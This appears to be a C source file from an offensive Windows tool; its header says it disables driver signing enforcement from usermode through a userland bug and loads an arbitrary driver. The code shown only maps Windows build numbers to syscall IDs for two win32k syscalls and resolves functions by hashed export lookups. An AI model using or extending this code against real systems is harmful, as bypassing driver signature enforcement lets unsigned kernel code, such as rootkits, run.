/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Returns the syscall ID of for the 
 * NtUserSetInformationThread syscall.
 *
**/

D_SEC( D ) ULONG NtUserSetInformationThreadId( VOID )
{
	API			Api;
	RTL_OSVERSIONINFOW	Ver;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );

	Ver.dwOSVersionInfoSize = sizeof( Ver );
	Api.RtlGetVersion = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLGETVERSION );
	Api.RtlGetVersion( &Ver );

	switch( Ver.dwBuildNumber ) {
		case 6000:
			return 4326;
		case 7601:
			return 4321;
		case 9200:
			return 4321;
		case 9600:
			return 4322;
		case 10240:
			return 4323;
		case 10586:
			return 4323;
		case 14393:
			return 4322;
		case 15063:
			return 4311;
		case 16299:
			return 4311;
		case 17134:
			return 4311;
		case 17763:
			return 4311;
		case 18362:
			return 4311;
		case 18363:
			return 4311;
		case 19041:
			return 4308;
		case 19042:
			return 4308;
		case 19043:
			return 4308;
		case 22000:
			return 4302;
	};
	return STATUS_NOT_IMPLEMENTED;
};

/**
 *
 * Purpose:
 *
 * Returns the syscall ID of for the 
 * NtUserHardErrorControl syscall.
 *
**/

D_SEC( D ) ULONG NtUserHardErrorControlId( VOID )
{
	API			Api;
	RTL_OSVERSIONINFOW	Ver;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ver, sizeof( Ver ) );

	Ver.dwOSVersionInfoSize = sizeof( Ver );
	Api.RtlGetVersion = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLGETVERSION );
	Api.RtlGetVersion( &Ver );

	switch( Ver.dwBuildNumber ) {
		case 6000:
			return 4786;
		case 7601:
			return 4812;
		case 9200:
			return 4943;
		case 9600:
			return 4986;
		case 10240:
			return 5058;
		case 10586:
			return 5062;
		case 14393:
			return 5057;
		case 15063:
			return 5047;
		case 16299:
			return 5080;
		case 17134:
			return 5123;
		case 17763:
			return 5139;
		case 18362:
			return 5150;
		case 18363:
			return 5150;
		case 19041:
			return 5199;
		case 19042:
			return 5199;
		case 19043:
			return 5199;
		case 22000:
			return 5249;
	};
	return STATUS_NOT_IMPLEMENTED;
};
